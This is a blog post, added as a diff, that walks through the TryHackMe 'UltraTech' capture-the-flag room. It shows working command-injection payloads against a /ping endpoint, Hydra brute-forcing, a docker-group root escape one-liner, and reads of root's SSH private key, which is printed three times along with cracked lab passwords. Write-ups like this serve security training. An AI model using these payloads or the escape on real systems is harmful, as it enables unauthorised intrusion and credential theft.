@@ -1,0 +1,479 @@
+---
+layout: post
+title:  "UltraTech"
+date:   2024-02-10 12:50:01 -0600
+categories: TryHackMe
+---
+[Ultratech](https://tryhackme.com/room/ultratech1)
+
+first edit the host file and begin
+
+```
+echo "10.10.159.236    ultratech" >> /etc/hosts
+```
+
+The nmap takes a long time, so just be patient!
+
+```
+nmap -A -p- -T4 $IP
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2024-02-11 02:19 GMT
+Warning: 10.10.52.50 giving up on port because retransmission cap hit (6).
+Nmap scan report for ip-10-10-52-50.eu-west-1.compute.internal (10.10.52.50)
+Host is up (0.00040s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     vsftpd 3.0.3
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
+|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
+|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (EdDSA)
+8081/tcp  open  http    Node.js Express framework
+|_http-cors: HEAD GET POST PUT DELETE PATCH
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
+MAC Address: 02:31:41:B0:61:27 (Unknown)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.60%E=4%D=2/11%OT=21%CT=1%CU=31866%PV=Y%DS=1%DC=D%G=Y%M=023141%T
+OS:M=65C834B1%P=x86_64-pc-linux-gnu)SEQ(SP=109%GCD=1%ISR=109%TI=Z%CI=I%TS=A
+OS:)SEQ(SP=109%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=A)OPS(O1=M2301ST11NW7%O2=M23
+OS:01ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)
+OS:WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=
+OS:6903%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N
+OS:)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0
+OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7
+OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=
+OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.40 ms ip-10-10-52-50.eu-west-1.compute.internal (10.10.52.50)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1537.20 seconds
+```
+Perhaps next time try nmap -sC -sV -p- $IP
+
+```
+gobuster dir -u http://$IP:8081 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.56.51:8081
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2024/02/11 01:50:48 Starting gobuster
+===============================================================
+/auth (Status: 200)
+/Auth (Status: 200)
+===============================================================
+2024/02/11 01:51:16 Finished
+===============================================================
+```
+Now the other port
+```
+gobuster dir -u http://$IP:31331 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.52.50:31331
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2024/02/11 03:05:33 Starting gobuster
+===============================================================
+/images (Status: 301)
+/css (Status: 301)
+/js (Status: 301)
+/javascript (Status: 301)
+/server-status (Status: 403)
+===============================================================
+2024/02/11 03:05:54 Finished
+===============================================================
+```
+Try a different wordlist
+```
+gobuster dir -u http://ultratech:31331 -w /usr/share/wordlists/dirb/common.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://ultratech:31331
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2024/02/11 17:17:08 Starting gobuster
+===============================================================
+/.hta (Status: 403)
+/.htpasswd (Status: 403)
+/.htaccess (Status: 403)
+/css (Status: 301)
+/favicon.ico (Status: 200)
+/images (Status: 301)
+/index.html (Status: 200)
+/javascript (Status: 301)
+/js (Status: 301)
+/robots.txt (Status: 200)
+/server-status (Status: 403)
+===============================================================
+2024/02/11 17:17:08 Finished
+===============================================================
+
+```
+navigate to http://ultratech:31331/robots.txt
+```
+Allow: *
+User-Agent: *
+Sitemap: /utech_sitemap.txt
+```
+navigate to http://ultratech:31331/utech_sitemap.txt
+```
+/
+/index.html
+/what.html
+/partners.html
+```
+navigate to http://ultratech:31331/partners.html to get LOGIN SCREEN!
+
+Now start Burp Suite.
+Set the target scopes to
+http://ultratech:8081
+http://ultratech:31331
+Show only in-scope items
+
+Notice there is a /ping?ip=ultratech
+
+test command injection?
+change GET /ping?ip=8.8.8.8
+
+```
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Access-Control-Allow-Origin: *
+Content-Type: text/html; charset=utf-8
+Content-Length: 141
+ETag: W/"8d-rxKhPaySD56Q0ZbRDBis0iX+7v4"
+Date: Sun, 11 Feb 2024 17:29:33 GMT
+Connection: close
+
+PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+
+--- 8.8.8.8 ping statistics ---
+1 packets transmitted, 0 received, 100% packet loss, time 0ms
+```
+Now the matter is just sending [command injection payloads](https://github.com/payloadbox/command-injection-payload-list)
+
+after playing with the GET command managed to get this
+```
+GET /ping?ip=`id`; HTTP/1.1
+
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Access-Control-Allow-Origin: *
+Content-Type: text/html; charset=utf-8
+Content-Length: 61
+ETag: W/"3d-2J2mX1i3I4uQhsVi8ABaq24IgPw"
+Date: Sun, 11 Feb 2024 17:38:22 GMT
+Connection: close
+
+ping: groups=1002(www): Temporary failure in name resolution
+```
+now try to get other info
+```
+GET /ping?ip=`ls -la`; HTTP/1.1
+
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Access-Control-Allow-Origin: *
+Content-Type: text/html; charset=utf-8
+Content-Length: 49
+ETag: W/"31-HlSQypQjJ8bvYzsasjt4yTZkt90"
+Date: Sun, 11 Feb 2024 17:41:38 GMT
+Connection: close
+
+ping: utech.db.sqlite: Name or service not known
+```
+
+Determin python level:
+```
+GET /ping?ip=`which+python`; HTTP/1.1
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Access-Control-Allow-Origin: *
+Content-Type: text/html; charset=utf-8
+Content-Length: 60
+ETag: W/"3c-k/KL6a9ZksD6TQvNT3tu7XbQQEE"
+Date: Sun, 11 Feb 2024 17:43:54 GMT
+Connection: close
+
+ping: /usr/bin/python: Temporary failure in name resolution
+```
+run python webserver
+
+```
+GET /ping?ip=`python3+-m+http.server+9000`; HTTP/1.1
+```
+*turn Intercept OFF
+and browse to:  http://ultratech:9000/
+
+Downloaded:  
+start.sh 
+utrch.db.sqlite
+
+start.sh
+```
+if ps -a | grep 'node';then
+    echo 'API is running';
+else
+    cd /home/www/api/ && node index.js;
+fi
+```
+DB Browser for SQLite
+
+Find users table
+```
+admin:0d0ea5111e3c1def594c1684e3b9be84
+r00t:f357a0c52799563c7c7b76c1e7543a32
+```
+crackstation.net
+n100906
+mrsheafy
+
+```
+root@ip-10-10-66-38:~# cat > ultratech.users << eof
+> admin
+> r00t
+> eof
+
+root@ip-10-10-66-38:~# cat > ultratech.passwords << eof
+> n100906
+> mrsheafy
+> eof
+
+hydra -fV -L ultratech.users -P ultratech.passwords ftp://ultratech
+
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2024-02-11 18:04:42
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:2/p:2), ~1 try per task
+[DATA] attacking ftp://ultratech:21/
+[ATTEMPT] target ultratech - login "admin" - pass "n100906" - 1 of 4 [child 0] (0/0)
+[ATTEMPT] target ultratech - login "admin" - pass "mrsheafy" - 2 of 4 [child 1] (0/0)
+[ATTEMPT] target ultratech - login "r00t" - pass "n100906" - 3 of 4 [child 2] (0/0)
+[ATTEMPT] target ultratech - login "r00t" - pass "mrsheafy" - 4 of 4 [child 3] (0/0)
+[21][ftp] host: ultratech   login: r00t   password: n100906
+[STATUS] attack finished for ultratech (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2024-02-11 18:04:43
+
+```
+
+Let's log in
+
+```
+ssh r00t@ultratech
+The authenticity of host 'ultratech (10.10.159.236)' can't be established.
+ECDSA key fingerprint is SHA256:RWpgXxl3MyUqAN4AHrH/ntrheh2UzgJMoGAPI+qmGEU.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added 'ultratech,10.10.159.236' (ECDSA) to the list of known hosts.
+r00t@ultratech's password: 
+Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Feb 11 18:48:18 UTC 2024
+
+  System load:  0.0                Processes:           104
+  Usage of /:   24.4% of 19.56GB   Users logged in:     0
+  Memory usage: 39%                IP address for eth0: 10.10.159.236
+  Swap usage:   0%
+
+
+1 package can be updated.
+0 updates are security updates.
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+r00t@ultratech-prod:~$ id
+uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
+r00t@ultratech-prod:~$ docker ps -a
+CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                     PORTS               NAMES
+7beaaeecd784        bash                "docker-entrypoint.s\u2026"   4 years ago         Exited (130) 4 years ago                       unruffled_shockley
+696fb9b45ae5        bash                "docker-entrypoint.s\u2026"   4 years ago         Exited (127) 4 years ago                       boring_varahamihira
+9811859c4c5c        bash                "docker-entrypoint.s\u2026"   4 years ago         Exited (127) 4 years ago                       boring_volhard
+
+```
+Look at docker logs
+```
+docker logs boring_volhard 
+bash: /root:/root: No such file or directory
+docker logs boring_varahamihira
+bash: /:/hostOS: No such file or directory
+docker logs unruffled_shockley 
+```
+BINGO!
+```
+bash-5.0# cat /hostOS/root/.ssh/id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
+sIOfoEC+vvs9SRxy8yNBQ2bx2kLYqoZpDJOuTC4Y7VIb+3xeLjhmvtNQGofffkQA
+jSMMlh1MG14fOInXKTRQF8hPBWKB38BPdlNgm7dR5PUGFWni15ucYgCGq1Utc5PP
+NZVxika+pr/U0Ux4620MzJW899lDG6orIoJo739fmMyrQUjKRnp8xXBv/YezoF8D
+hQaP7omtbyo0dczKGkeAVCe6ARh8woiVd2zz5SHDoeZLe1ln4KSbIL3EiMQMzOpc
+jNn7oD+rqmh/ygoXL3yFRAowi+LFdkkS0gqgmwIDAQABAoIBACbTwm5Z7xQu7m2J
+tiYmvoSu10cK1UWkVQn/fAojoKHF90XsaK5QMDdhLlOnNXXRr1Ecn0cLzfLJoE3h
+YwcpodWg6dQsOIW740Yu0Ulr1TiiZzOANfWJ679Akag7IK2UMGwZAMDikfV6nBGD
+wbwZOwXXkEWIeC3PUedMf5wQrFI0mG+mRwWFd06xl6FioC9gIpV4RaZT92nbGfoM
+BWr8KszHw0t7Cp3CT2OBzL2XoMg/NWFU0iBEBg8n8fk67Y59m49xED7VgupK5Ad1
+5neOFdep8rydYbFpVLw8sv96GN5tb/i5KQPC1uO64YuC5ZOyKE30jX4gjAC8rafg
+o1macDECgYEA4fTHFz1uRohrRkZiTGzEp9VUPNonMyKYHi2FaSTU1Vmp6A0vbBWW
+tnuyiubefzK5DyDEf2YdhEE7PJbMBjnCWQJCtOaSCz/RZ7ET9pAMvo4MvTFs3I97
+eDM3HWDdrmrK1hTaOTmvbV8DM9sNqgJVsH24ztLBWRRU4gOsP4a76s0CgYEA0LK/
+/kh/lkReyAurcu7F00fIn1hdTvqa8/wUYq5efHoZg8pba2j7Z8g9GVqKtMnFA0w6
+t1KmELIf55zwFh3i5MmneUJo6gYSXx2AqvWsFtddLljAVKpbLBl6szq4wVejoDye
+lEdFfTHlYaN2ieZADsbgAKs27/q/ZgNqZVI+CQcCgYAO3sYPcHqGZ8nviQhFEU9r
+4C04B/9WbStnqQVDoynilJEK9XsueMk/Xyqj24e/BT6KkVR9MeI1ZvmYBjCNJFX2
+96AeOaJY3S1RzqSKsHY2QDD0boFEjqjIg05YP5y3Ms4AgsTNyU8TOpKCYiMnEhpD
+kDKOYe5Zh24Cpc07LQnG7QKBgCZ1WjYUzBY34TOCGwUiBSiLKOhcU02TluxxPpx0
+v4q2wW7s4m3nubSFTOUYL0ljiT+zU3qm611WRdTbsc6RkVdR5d/NoiHGHqqSeDyI
+6z6GT3CUAFVZ01VMGLVgk91lNgz4PszaWW7ZvAiDI/wDhzhx46Ob6ZLNpWm6JWgo
+gLAPAoGAdCXCHyTfKI/80YMmdp/k11Wj4TQuZ6zgFtUorstRddYAGt8peW3xFqLn
+MrOulVZcSUXnezTs3f8TCsH1Yk/2ue8+GmtlZe/3pHRBW0YJIAaHWg5k2I3hsdAz
+bPB7E9hlrI0AconivYDzfpxfX+vovlP/DdNVub/EO7JSO+RAmqo=
+-----END RSA PRIVATE KEY-----
+bash-5.0# cat /hostOS/root/.ssh/id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
+sIOfoEC+vvs9SRxy8yNBQ2bx2kLYqoZpDJOuTC4Y7VIb+3xeLjhmvtNQGofffkQA
+jSMMlh1MG14fOInXKTRQF8hPBWKB38BPdlNgm7dR5PUGFWni15ucYgCGq1Utc5PP
+NZVxika+pr/U0Ux4620MzJW899lDG6orIoJo739fmMyrQUjKRnp8xXBv/YezoF8D
+hQaP7omtbyo0dczKGkeAVCe6ARh8woiVd2zz5SHDoeZLe1ln4KSbIL3EiMQMzOpc
+jNn7oD+rqmh/ygoXL3yFRAowi+LFdkkS0gqgmwIDAQABAoIBACbTwm5Z7xQu7m2J
+tiYmvoSu10cK1UWkVQn/fAojoKHF90XsaK5QMDdhLlOnNXXRr1Ecn0cLzfLJoE3h
+YwcpodWg6dQsOIW740Yu0Ulr1TiiZzOANfWJ679Akag7IK2UMGwZAMDikfV6nBGD
+wbwZOwXXkEWIeC3PUedMf5wQrFI0mG+mRwWFd06xl6FioC9gIpV4RaZT92nbGfoM
+BWr8KszHw0t7Cp3CT2OBzL2XoMg/NWFU0iBEBg8n8fk67Y59m49xED7VgupK5Ad1
+5neOFdep8rydYbFpVLw8sv96GN5tb/i5KQPC1uO64YuC5ZOyKE30jX4gjAC8rafg
+o1macDECgYEA4fTHFz1uRohrRkZiTGzEp9VUPNonMyKYHi2FaSTU1Vmp6A0vbBWW
+tnuyiubefzK5DyDEf2YdhEE7PJbMBjnCWQJCtOaSCz/RZ7ET9pAMvo4MvTFs3I97
+eDM3HWDdrmrK1hTaOTmvbV8DM9sNqgJVsH24ztLBWRRU4gOsP4a76s0CgYEA0LK/
+/kh/lkReyAurcu7F00fIn1hdTvqa8/wUYq5efHoZg8pba2j7Z8g9GVqKtMnFA0w6
+t1KmELIf55zwFh3i5MmneUJo6gYSXx2AqvWsFtddLljAVKpbLBl6szq4wVejoDye
+lEdFfTHlYaN2ieZADsbgAKs27/q/ZgNqZVI+CQcCgYAO3sYPcHqGZ8nviQhFEU9r
+4C04B/9WbStnqQVDoynilJEK9XsueMk/Xyqj24e/BT6KkVR9MeI1ZvmYBjCNJFX2
+96AeOaJY3S1RzqSKsHY2QDD0boFEjqjIg05YP5y3Ms4AgsTNyU8TOpKCYiMnEhpD
+kDKOYe5Zh24Cpc07LQnG7QKBgCZ1WjYUzBY34TOCGwUiBSiLKOhcU02TluxxPpx0
+v4q2wW7s4m3nubSFTOUYL0ljiT+zU3qm611WRdTbsc6RkVdR5d/NoiHGHqqSeDyI
+6z6GT3CUAFVZ01VMGLVgk91lNgz4PszaWW7ZvAiDI/wDhzhx46Ob6ZLNpWm6JWgo
+gLAPAoGAdCXCHyTfKI/80YMmdp/k11Wj4TQuZ6zgFtUorstRddYAGt8peW3xFqLn
+MrOulVZcSUXnezTs3f8TCsH1Yk/2ue8+GmtlZe/3pHRBW0YJIAaHWg5k2I3hsdAz
+bPB7E9hlrI0AconivYDzfpxfX+vovlP/DdNVub/EO7JSO+RAmqo=
+-----END RSA PRIVATE KEY-----
+bash-5.0# ^C
+bash-5.0# exit
+r00t@ultratech-prod:~$ 
+
+```
+Now continue to get root
+
+```
+docker run -v/:/mnt --rm -it alpine chroot /mnt sh
+Unable to find image 'alpine:latest' locally
+docker: Error response from daemon: Get https://registry-1.docker.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers).
+See 'docker run --help'.
+
+
+docker run -v/:/mnt --rm -it bash chroot /mnt sh
+
+
+# # # id
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
+# uname
+Linux
+# lsb_release
+No LSB modules are available.
+# lsb_release -a
+No LSB modules are available.
+Distributor ID:	Ubuntu
+Description:	Ubuntu 18.04.2 LTS
+Release:	18.04
+Codename:	bionic
+
+# ls
+bin   home	      lib64	  opt	sbin	  sys  vmlinuz
+boot  initrd.img      lost+found  proc	snap	  tmp  vmlinuz.old
+dev   initrd.img.old  media	  root	srv	  usr
+etc   lib	      mnt	  run	swap.img  var
+# cd /root
+# ls
+private.txt
+# cat private.txt
+# Life and acomplishments of Alvaro Squalo - Tome I
+
+Memoirs of the most successful digital nomdad finblocktech entrepreneur
+in the world.
+
+By himself.
+
+## Chapter 1 - How I became successful
+
+# cat /root/.ssh/id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
+sIOfoEC+vvs9SRxy8yNBQ2bx2kLYqoZpDJOuTC4Y7VIb+3xeLjhmvtNQGofffkQA
+jSMMlh1MG14fOInXKTRQF8hPBWKB38BPdlNgm7dR5PUGFWni15ucYgCGq1Utc5PP
+NZVxika+pr/U0Ux4620MzJW899lDG6orIoJo739fmMyrQUjKRnp8xXBv/YezoF8D
+hQaP7omtbyo0dczKGkeAVCe6ARh8woiVd2zz5SHDoeZLe1ln4KSbIL3EiMQMzOpc
+jNn7oD+rqmh/ygoXL3yFRAowi+LFdkkS0gqgmwIDAQABAoIBACbTwm5Z7xQu7m2J
+tiYmvoSu10cK1UWkVQn/fAojoKHF90XsaK5QMDdhLlOnNXXRr1Ecn0cLzfLJoE3h
+YwcpodWg6dQsOIW740Yu0Ulr1TiiZzOANfWJ679Akag7IK2UMGwZAMDikfV6nBGD
+wbwZOwXXkEWIeC3PUedMf5wQrFI0mG+mRwWFd06xl6FioC9gIpV4RaZT92nbGfoM
+BWr8KszHw0t7Cp3CT2OBzL2XoMg/NWFU0iBEBg8n8fk67Y59m49xED7VgupK5Ad1
+5neOFdep8rydYbFpVLw8sv96GN5tb/i5KQPC1uO64YuC5ZOyKE30jX4gjAC8rafg
+o1macDECgYEA4fTHFz1uRohrRkZiTGzEp9VUPNonMyKYHi2FaSTU1Vmp6A0vbBWW
+tnuyiubefzK5DyDEf2YdhEE7PJbMBjnCWQJCtOaSCz/RZ7ET9pAMvo4MvTFs3I97
+eDM3HWDdrmrK1hTaOTmvbV8DM9sNqgJVsH24ztLBWRRU4gOsP4a76s0CgYEA0LK/
+/kh/lkReyAurcu7F00fIn1hdTvqa8/wUYq5efHoZg8pba2j7Z8g9GVqKtMnFA0w6
+t1KmELIf55zwFh3i5MmneUJo6gYSXx2AqvWsFtddLljAVKpbLBl6szq4wVejoDye
+lEdFfTHlYaN2ieZADsbgAKs27/q/ZgNqZVI+CQcCgYAO3sYPcHqGZ8nviQhFEU9r
+4C04B/9WbStnqQVDoynilJEK9XsueMk/Xyqj24e/BT6KkVR9MeI1ZvmYBjCNJFX2
+96AeOaJY3S1RzqSKsHY2QDD0boFEjqjIg05YP5y3Ms4AgsTNyU8TOpKCYiMnEhpD
+kDKOYe5Zh24Cpc07LQnG7QKBgCZ1WjYUzBY34TOCGwUiBSiLKOhcU02TluxxPpx0
+v4q2wW7s4m3nubSFTOUYL0ljiT+zU3qm611WRdTbsc6RkVdR5d/NoiHGHqqSeDyI
+6z6GT3CUAFVZ01VMGLVgk91lNgz4PszaWW7ZvAiDI/wDhzhx46Ob6ZLNpWm6JWgo
+gLAPAoGAdCXCHyTfKI/80YMmdp/k11Wj4TQuZ6zgFtUorstRddYAGt8peW3xFqLn
+MrOulVZcSUXnezTs3f8TCsH1Yk/2ue8+GmtlZe/3pHRBW0YJIAaHWg5k2I3hsdAz
+bPB7E9hlrI0AconivYDzfpxfX+vovlP/DdNVub/EO7JSO+RAmqo=
+-----END RSA PRIVATE KEY-----
+# 
+
+```
+The End!
